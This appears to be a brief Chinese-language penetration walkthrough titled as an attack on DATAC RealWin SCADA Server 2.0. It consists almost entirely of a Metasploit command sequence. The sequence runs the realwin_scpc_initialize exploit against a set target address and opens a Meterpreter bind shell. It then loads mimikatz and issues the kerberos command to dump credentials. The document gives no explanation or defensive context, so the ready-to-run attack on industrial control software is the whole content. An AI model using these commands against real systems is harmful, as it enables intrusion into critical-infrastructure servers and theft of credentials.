# 利用Metasploit渗透DATAC-RealWin-SCADA Server2.0

```
msfconsole
use exploit/windows/scada/realwin_scpc_initialize
set RHOST 192.168.109.141
set payload windows/meterpreter/bind_tcp
show options
exploit
sysinfo
load mimikatz
kerberos
```

## 